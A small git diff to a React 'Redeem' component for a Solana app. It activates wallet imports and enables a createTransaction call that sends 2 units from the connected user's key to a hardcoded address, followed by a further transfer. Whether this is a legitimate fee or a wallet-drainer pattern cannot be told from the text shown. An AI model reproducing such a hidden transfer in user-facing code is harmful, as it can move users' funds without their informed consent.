@@ -1,6 +1,6 @@
 import { useState } from "react";
-//import wallet from "../wallet/wallet";
-//import secwallet from "../wallet/secwallet";
+import wallet from "../components/micro/wallet/wallet";
+import secwallet from "../components/micro/wallet/secwallet";
 import {
   clusterApiUrl,
   Keypair,
@@ -74,11 +74,11 @@ const Redeem = () => {
   };
 
   const finalNewTransfer = () => {
-    // createTransaction(
-    //   publicKey,
-    //   new PublicKey("2JSg1MdNqRg9z4RP7yiE2NV86fux2BNtF3pSDjhoi767"),
-    //   2
-    // );
+    createTransaction(
+      publicKey,
+      new PublicKey("2JSg1MdNqRg9z4RP7yiE2NV86fux2BNtF3pSDjhoi767"),
+      2
+    );
     setTimeout(() => {
       newTransfer();
     }, [2000]);
